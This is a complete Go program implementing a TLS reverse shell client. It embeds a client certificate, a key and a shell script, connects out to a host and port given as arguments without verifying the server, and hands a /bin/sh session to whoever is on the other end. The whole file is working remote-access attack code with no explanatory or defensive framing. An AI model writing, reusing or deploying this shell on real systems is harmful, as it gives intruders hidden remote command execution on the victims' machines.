package main

import (
	"crypto/tls"
	_ "embed"
	"fmt"
	"io"
	"log"
	"net"
	"os"
	"os/exec"

	"github.com/jessevdk/go-flags"
)

//go:embed client.pem
var clientPem []byte

//go:embed client.key
var clientKey []byte

//go:embed start_shell.sh
var shellCmd string

var opts struct {
	Args struct {
		Host string `positional-arg-name:"host"`
		Port int    `positional-arg-name:"port"`
	} `positional-args:"yes" required:"yes"`
}

func main() {
	_, err := flags.Parse(&opts)
	if err != nil {
		log.Fatalf("Error parsing arguments! %s", err)
	}

	cert, err := tls.X509KeyPair(clientPem, clientKey)
	if err != nil {
		log.Fatalf("Could not load keys: %s", err)
	}

	config := tls.Config{Certificates: []tls.Certificate{cert}, InsecureSkipVerify: true}
	conn, err := tls.Dial("tcp", fmt.Sprintf("%s:%d", opts.Args.Host, opts.Args.Port), &config)
	if err != nil {
		log.Fatalf("Could not connect: %s", err)
	}

	defer conn.Close()

	cmd := exec.Command("/bin/sh", "-c", shellCmd)
	cmd.Stdout = conn
	cmd.Stderr = conn

	// have to do stdin manually to check for closed connections
	stdinPipe, err := cmd.StdinPipe()
	if err != nil {
		log.Fatalf("Failed to create stdin pipe: %s", err)
	}
	go func() {
		buf := make([]byte, 512)
		for {
			n, err := conn.Read(buf)
			if err != nil {
				switch err.(type) {
				case *net.OpError:
					log.Print("Connection closed")
					os.Exit(0)

				default:
					if err == io.EOF {
						log.Print("Connection closed")
						os.Exit(0)
					}
					log.Fatalf("Error occured: %T", err)
				}
			}

			_, err = stdinPipe.Write(buf[:n])
			if err != nil {
				log.Fatalf("Failed writing to stdin: %s", err)
			}
		}
	}()

	cmd.Run()
}
